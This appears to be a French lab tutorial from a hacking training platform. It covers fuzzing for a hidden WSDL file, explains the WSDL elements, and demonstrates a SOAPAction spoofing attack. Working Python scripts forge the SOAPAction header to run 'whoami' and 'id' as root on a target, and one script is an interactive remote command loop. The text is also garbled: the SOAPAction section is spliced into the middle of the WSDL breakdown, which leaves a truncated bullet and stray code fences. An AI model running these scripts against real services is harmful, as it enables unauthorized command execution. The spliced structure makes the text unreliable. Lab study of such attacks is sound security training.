Langage de description de services Web (WSDL)
=============================================

* * * * *

WSDL signifie Web Service Description Language. WSDL est un fichier XML exposé par les services Web qui informe les clients des services/méthodes fournis, y compris leur emplacement et la convention d'appel de méthode.

Le fichier WSDL d'un service Web ne doit pas toujours être accessible. Les développeurs peuvent ne pas vouloir exposer publiquement le fichier WSDL d'un service Web, ou ils peuvent l'exposer via un emplacement inhabituel, en suivant une approche de sécurité par l'obscurité. Dans ce dernier cas, le fuzzing de répertoire/paramètre peut révéler l'emplacement et le contenu d'un fichier WSDL.

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre le service cible et suivez-le.

Supposons que nous évaluons un service SOAP résidant dans `http://<TARGET IP>:3002`. Nous n'avons pas été informés d'un fichier WSDL.

Commençons par effectuer un fuzzing de répertoire de base sur le service Web.

```
dsgsec@htb[/htb]$ dirb http://<TARGET IP>:3002

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Mar 25 11:53:09 2022
URL_BASE: http://<TARGET IP>:3002/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://<TARGET IP>:3002/ ----
+ http://<TARGET IP>:3002/wsdl (CODE:200|SIZE:0)

-----------------
END_TIME: Fri Mar 25 11:53:24 2022
DOWNLOADED: 4612 - FOUND: 1

```

Il semble `http://<TARGET IP>:3002/wsdl`exister. Examinons son contenu comme suit.

```
dsgsec@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl

```

La réponse est vide ! Il existe peut-être un paramètre qui nous permettra d'accéder au fichier WSDL du service Web SOAP. Effectuons le fuzzing des paramètres en utilisant *ffuf* et la liste [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) , comme suit. *-fs 0* filtre les réponses vides (taille = 0) et *-mc 200* correspond aux réponses *HTTP 200* .

```
dsgsec@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>:3002/wsdl?FUZZ
 :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error
:: Progress: [537/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro
wsdl [Status: 200, Size: 4461, Words: 967, Lines: 186]
:: Progress: [982/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro::
Progress: [1153/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err::
Progress: [1780/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err::
Progress: [2461/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err::
Progress: [2588/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err::
Progress: [2588/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

Il semble que *wsdl* soit un paramètre valide. Lançons maintenant une demande de`http://<TARGET IP>:3002/wsdl?wsdl`

```
dsgsec@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl

<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/"
	xmlns:s="http://www.w3.org/2001/XMLSchema"
	xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/"
	xmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
	xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
	xmlns:tns="http://tempuri.org/"
	xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
	xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
	xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
	xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
	<wsdl:types>
		<s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
			<s:element name="LoginRequest">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
						<s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="LoginResponse">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="ExecuteCommandRequest">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="ExecuteCommandResponse">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
		</s:schema>
	</wsdl:types>
	<!-- Login Messages -->
	<wsdl:message name="LoginSoapIn">
		<wsdl:part name="parameters" element="tns:LoginRequest"/>
	</wsdl:message>
	<wsdl:message name="LoginSoapOut">
		<wsdl:part name="parameters" element="tns:LoginResponse"/>
	</wsdl:message>
	<!-- ExecuteCommand Messages -->
	<wsdl:message name="ExecuteCommandSoapIn">
		<wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
	</wsdl:message>
	<wsdl:message name="ExecuteCommandSoapOut">
		<wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
	</wsdl:message>
	<wsdl:portType name="HacktheBoxSoapPort">
		<!-- Login Operaion | PORT -->
		<wsdl:operation name="Login">
			<wsdl:input message="tns:LoginSoapIn"/>
			<wsdl:output message="tns:LoginSoapOut"/>
		</wsdl:operation>
		<!-- ExecuteCommand Operation | PORT -->
		<wsdl:operation name="ExecuteCommand">
			<wsdl:input message="tns:ExecuteCommandSoapIn"/>
			<wsdl:output message="tns:ExecuteCommandSoapOut"/>
		</wsdl:operation>
	</wsdl:portType>
	<wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
		<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
		<!-- SOAP Login Action -->
		<wsdl:operation name="Login">
			<soap:operation soapAction="Login" style="document"/>
			<wsdl:input>
				<soap:body use="literal"/>
			</wsdl:input>
			<wsdl:output>
				<soap:body use="literal"/>
			</wsdl:output>
		</wsdl:operation>
		<!-- SOAP ExecuteCommand Action -->
		<wsdl:operation name="ExecuteCommand">
			<soap:operation soapAction="ExecuteCommand" style="document"/>
			<wsdl:input>
				<soap:body use="literal"/>
			</wsdl:input>
			<wsdl:output>
				<soap:body use="literal"/>
			</wsdl:output>
		</wsdl:operation>
	</wsdl:binding>
	<wsdl:service name="HacktheboxService">
		<wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
			<soap:address location="http://localhost:80/wsdl"/>
		</wsdl:port>
	</wsdl:service>
</wsdl:definitions>

```

Nous avons identifié le fichier WSDL du service SOAP !

Remarque : Les fichiers WSDL peuvent être trouvés sous de nombreuses formes, telles que `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco`etc. [DISCO](https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/xml-files-publishing-and-discovering-web-services-with-disco-and-uddi) est une technologie Microsoft de publication et de découverte de services Web.

Répartition des fichiers WSDL
-----------------------------

* * * * *

Passons maintenant en revue ensemble le fichier WSDL identifié ci-dessus.

Le fichier WSDL ci-dessus suit la disposition [WSDL version 1.1](https://www.w3.org/TR/2001/NOTE-wsdl-20010315) et se compose des éléments suivants.

-   `Definition`
    -   L'élément racine de tous les fichiers WSDL. Dans la définition, le nom du service Web est spécifié, tous les espaces de noms utilisés dans le document WSDL sont déclarés et tous les autres éléments de service sont définis.
    -   Code : xml

        ```
        <wsdl:definitions targetNamespace="http://tempuri.org/"

            <wsdl:types></wsdl:types>
            <wsdl:message name="LoginSoapIn"></wsdl:message>
            <wsdl:portType name="HacktheBoxSoapPort">
          	  <wsdl:operation name="Login"></wsdl:operation>
            </wsdl:portType>
            <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
          	  <wsdl:operation name="Login">
          		  <soap:operation soapAction="Login" style="document"/>
          		  <wsdl:input></wsdl:input>
          		  <wsdl:output></wsdl:output>
          	  </wsdl:operation>
            </wsdl:binding>
            <wsdl:service name="HacktheboxService"></wsdl:service>
        </wsdl:definitions>

        ```

-   `Data Types`
    -   Les types de données à utiliser dans les messages échangés.
    -   Code : xml

        ```
        <wsdl:types>
            <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
          	  <s:element name="LoginRequest">
          		  <s:complexType>
          			  <s:sequence>
          				  <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
          				  <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
          			  </s:sequence>
          		  </s:complexType>
          	  </s:element>
          	  <s:element name="LoginResponse">
          		  <s:complexType>
          			  <s:sequence>
          				  <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          			  </s:sequence>
          		  </s:complexType>
          	  </s:element>
          	  <s:element name="ExecuteCommandRequest">
          		  <s:complexType>
          			  <s:sequence>
          				  <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
          			  </s:sequence>
          		  </s:complexType>
          	  </s:element>
          	  <s:element name="ExecuteCommandResponse">
          		  <s:complexType>
          			  <s:sequence>
          				  <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          			  </s:sequence>
          		  </s:complexType>
          	  </s:element>
            </s:schema>
        </wsdl:types>

        ```

-   `Messages`
    -   Définit les opérations d'entrée et de sortie prises en charge par le service Web. En d'autres termes, à travers l' élément *messages* , les messages à échanger sont définis et présentés soit comme un document entier, soit comme des arguments à mapper à une invocation de méthode.
    -   Code : xml

        ```
        <!-- Login Messages -->
        <wsdl:message name="LoginSoapIn">
            <wsdl:part name="parameters" element="tns:LoginRequest"/>
        </wsdl:message>
        <wsdl:message name="LoginSoapOut">
            <wsdl:part name="parameters" element="tns:LoginResponse"/>
        </wsdl:message>
        <!-- ExecuteCommand Messages -->
        <wsdl:message name="ExecuteCommandSoapIn">
            <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
        </wsdl:message>
        <wsdl:message name="ExecuteCommandSoapOut">
            <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
        </wsdl:message>
          ```	

        ```

-   `Operation`
    -   Définit les actions SOAP disponibles parallèlement à l'encodage de chaque message.
-   `Port Type`
    -   Encapsule tous les messages d'entrée et de sortie possibles dans une opération. Plus précisément, il définit le service web, les opérations disponibles et les messages échangés. Veuillez noter que dans WSDL version 2.0, l' élément *d'interface* est chargé de définir les opérations disponibles et lorsqu'il s'agit de messages, l'élément de types (de données) gère leur définition.
    -   Code : xml

        ```
        <wsdl:portType name="HacktheBoxSoapPort">
            <!-- Login Operaion | PORT -->
            <wsdl:operation name="Login">
          	  <wsdl:input message="tns:LoginSoapIn"/>
          	  <wsdl:output message="tns:LoginSoapOut"/>
            </wsdl:operation>
            <!-- ExecuteCommand Operation | PORT -->
            <wsdl:operation name="ExecuteCommand">
          	  <wsdl:input message="tns:ExecuteCommandSoapIn"/>
          	  <wsdl:output message="tns:ExecuteCommandSoapOut"/>
            </wsdl:operation>
        </wsdl:portType>

        ```

-   `Binding`
    -   Lie l'opération à un type de port particulier. Considérez les liaisons comme des interfaces. Un client appellera le type de port concerné et, en utilisant les détails fournis par la liaison, pourra accéder aux opérations liées à ce type de port. En d'autres termes, les liaisons fournissent des détails d'accès au service Web, tels que le format de message, les opérations, les messages et les interfaces (dans le cas de WSDL version 2.0).
    -   Code : xml

        ```
        <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
            <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
            <!-- SOAP Login Action -->
            <wsdl:operation name="Login">
          	  <soap:operation soapAction="Login" style="document"/>
          	  <wsdl:input>
          		  <soap:body use="literal"/>
          	  </wsdl:input>
          	  <wsdl:output>
          		  <soap:body use="literal"/>
          	  </wsdl:output>
            </wsdl:operation>
            <!-- SOAP ExecuteCommand Action -->
            <wsdl:operation name="ExecuteCommand">
          	  <soap:operation soapAction="ExecuteCommand" style="document"/>
          	  <wsdl:input>
          		  <soap:body use="literal"/>
          	  </wsdl:input>
          	  <wsdl:output>
          		  <soap:body use="literal"/>
          	  </wsdl:output>
            </wsdl:operation>
        </wsdl:binding>

        ```

-   `Service`
    -   Un client appelle le service Web via le nom du service spécifié dans le numéro de service. Grâce à cet élément, le client identifie l'emplacement du service Web.
    -   Code : xml

       Usurpation SOAPAction
=====================

* * * * *

Les messages SOAP vers un service SOAP doivent inclure à la fois l'opération et les paramètres associés. Cette opération réside dans le premier élément enfant du corps du message SOAP. Si HTTP est le transport de choix, il est permis d'utiliser un en-tête HTTP supplémentaire appelé SOAPAction, qui contient le nom de l'opération. Le service Web récepteur peut identifier l'opération dans le corps SOAP via cet en-tête sans analyser aucun XML.

Si un service Web considère uniquement l'attribut SOAPAction lors de la détermination de l'opération à exécuter, il peut être vulnérable à l'usurpation SOAPAction.

Évaluons ensemble un service SOAP vulnérable au spoofing SOAPAction.

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre le service Web cible et suivez.

Supposons que nous évaluons un service Web SOAP, dont le fichier WSDL réside dans `http://<TARGET IP>:3002/wsdl?wsdl`.

Le fichier WSDL du service se trouve ci-dessous.

```
dsgsec@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl

<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/"
  xmlns:s="http://www.w3.org/2001/XMLSchema"
  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/"
  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
  xmlns:tns="http://tempuri.org/"
  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
  xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">

  <wsdl:types>

    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">

      <s:element name="LoginRequest">

        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
            <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
          </s:sequence>
        </s:complexType>

      </s:element>

      <s:element name="LoginResponse">

        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>
      </s:element>

      <s:element name="ExecuteCommandRequest">

        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
          </s:sequence>
        </s:complexType>

      </s:element>

      <s:element name="ExecuteCommandResponse">

        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>

      </s:element>

    </s:schema>

  </wsdl:types>

  <!-- Login Messages -->
  <wsdl:message name="LoginSoapIn">

    <wsdl:part name="parameters" element="tns:LoginRequest"/>

  </wsdl:message>

  <wsdl:message name="LoginSoapOut">

    <wsdl:part name="parameters" element="tns:LoginResponse"/>

  </wsdl:message>

  <!-- ExecuteCommand Messages -->
  <wsdl:message name="ExecuteCommandSoapIn">

    <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>

  </wsdl:message>

  <wsdl:message name="ExecuteCommandSoapOut">

    <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>

  </wsdl:message>

  <wsdl:portType name="HacktheBoxSoapPort">

    <!-- Login Operaion | PORT -->
    <wsdl:operation name="Login">

      <wsdl:input message="tns:LoginSoapIn"/>
      <wsdl:output message="tns:LoginSoapOut"/>

    </wsdl:operation>

    <!-- ExecuteCommand Operation | PORT -->
    <wsdl:operation name="ExecuteCommand">

      <wsdl:input message="tns:ExecuteCommandSoapIn"/>
      <wsdl:output message="tns:ExecuteCommandSoapOut"/>

    </wsdl:operation>

  </wsdl:portType>

  <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">

    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>

    <!-- SOAP Login Action -->
    <wsdl:operation name="Login">

      <soap:operation soapAction="Login" style="document"/>

      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>

      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>

    </wsdl:operation>

    <!-- SOAP ExecuteCommand Action -->
    <wsdl:operation name="ExecuteCommand">
      <soap:operation soapAction="ExecuteCommand" style="document"/>

      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>

      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>

  </wsdl:binding>

  <wsdl:service name="HacktheboxService">

    <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
      <soap:address location="http://localhost:80/wsdl"/>
    </wsdl:port>

  </wsdl:service>

</wsdl:definitions>

```

La première chose à laquelle il faut prêter attention est la suivante.

Code : xml

```
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>

```

Nous pouvons voir une opération SOAPAction appelée *ExecuteCommand* .

Voyons les paramètres.

Code : xml

```
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>

```

On remarque qu'il y a un paramètre *cmd* . Construisons un script Python pour émettre des requêtes (enregistrez-le sous `client.py`). Notez que le script ci-dessous essaiera de faire exécuter une `whoami`commande par le service SOAP.

Code : Python

```
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)

```

Le script Python peut être exécuté comme suit.

```
dsgsec@htb[/htb]$ python3 client.py
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'

```

Nous obtenons une erreur mentionnant *Cette fonction n'est autorisée que dans les réseaux internes* . Nous n'avons pas accès aux réseaux internes. Est-ce à dire que nous sommes bloqués ? Pas encore! Essayons une attaque par usurpation SOAPAction, comme suit.

Construisons un nouveau script Python pour notre attaque d'usurpation SOAPAction (enregistrez-le sous `client_soapaction_spoofing.py`).

Code : Python

```
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)

```

-   Nous spécifions *LoginRequest* dans `<soap:Body>`, afin que notre demande aboutisse. Cette opération est autorisée de l'extérieur.
-   Nous spécifions les paramètres de *ExecuteCommand* car nous voulons que le service SOAP exécute une `whoami`commande.
-   Nous spécifions l'opération bloquée ( *ExecuteCommand* ) dans l'en-tête SOAPAction

Si le service Web détermine l'opération à exécuter uniquement sur la base de l'en-tête SOAPAction, nous pouvons contourner les restrictions et demander au service SOAP d'exécuter une `whoami`commande.

Exécutons le nouveau script.

```
dsgsec@htb[/htb]$ python3 client_soapaction_spoofing.py
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root\n</result></LoginResponse></soap:Body></soap:Envelope>'

```

Notre `whoami`commande a été exécutée avec succès, contournant les restrictions via le spoofing SOAPAction !

Si vous souhaitez pouvoir spécifier plusieurs commandes et voir le résultat à chaque fois, utilisez le script Python suivant (enregistrez-le sous `automate.py`).

Code : Python

```
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)

```

Vous pouvez l'exécuter comme suit.

```
dsgsec@htb[/htb]$ python3 automate.py
$ id
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>uid=0(root) gid=0(root) groups=0(root)\n</result></LoginResponse></soap:Body></soap:Envelope>'
$
``` ```
            <wsdl:service name="HacktheboxService">

              <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
                <soap:address location="http://localhost:80/wsdl"/>
              </wsdl:port>

            </wsdl:service>

        ```

Dans la `SOAP Action Spoofing`section, plus tard, nous verrons comment nous pouvons tirer parti du fichier WSDL identifié pour interagir avec le service Web.
